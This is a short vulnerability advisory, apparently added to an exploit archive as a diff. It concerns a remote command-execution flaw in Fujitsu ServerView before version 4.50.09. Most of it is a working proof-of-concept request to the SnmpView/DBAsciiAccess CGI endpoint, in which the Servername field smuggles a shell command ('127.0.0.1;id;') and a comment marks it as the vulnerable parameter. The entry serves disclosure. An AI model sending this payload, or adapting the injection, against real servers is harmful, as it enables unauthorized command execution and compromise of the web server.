@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/24762/info
+
+Fujitsu ServerView is prone to a remote command-execution vulnerability because it fails to adequately sanitize user-supplied data.
+
+Attackers can exploit this issue to execute arbitrary commands with the privileges of the affected application. Successful attacks will compromise the application and underlying webserver; other attacks are also possible.
+
+Versions prior to Fujitsu ServerView 4.50.09 are vulnerable. 
+
+http://www.example.com/cgi-bin/ServerView/
+SnmpView/DBAsciiAccess
+?SSL=
+&Application=ServerView/SnmpView
+&Submit=Submit
+&UserID=1
+&Profile=
+&DBAccess=ASCII
+&Viewing=-1
+&Action=Show
+&ThisApplication=TestConnectivityFrame
+&DBElement=ServerName
+&DBValue=bcmes
+&DBList=snism
+&UserValue=
+&DBTableList=SERVER_LIST
+&Sorting=
+&ParameterList=What--primary,,
+OtherCommunity--public,,
+SecondIP--,,
+Timeout--5,,
+Community--public,,
+ServerName--bcmes,,
+Servername--127.0.0.1;id;,, # vulnerable parameter
+SType--Server 
